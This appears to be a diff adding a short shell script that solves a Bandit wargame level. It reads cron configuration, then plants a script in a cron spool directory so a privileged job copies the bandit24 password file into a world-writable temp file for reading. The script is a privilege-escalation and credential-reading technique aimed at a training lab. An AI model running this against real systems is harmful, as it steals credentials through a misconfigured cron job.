@@ -1,0 +1,22 @@
+ls /etc/cron.d
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+
+tmpScript=$(mktemp)
+tmpPass=$(mktemp)
+
+echo '#!/bin/sh' > $tmpScript
+echo "cat /etc/bandit_pass/bandit24 > $tmpPass" >> $tmpScript
+
+chmod a+rx $tmpScript
+chmod a+rw $tmpPass
+
+echo $tmpPass
+echo $tmpScript
+cat $tmpScript
+
+cp $tmpScript /var/spool/bandit24
+
+sleep 65
+
+cat $tmpPass
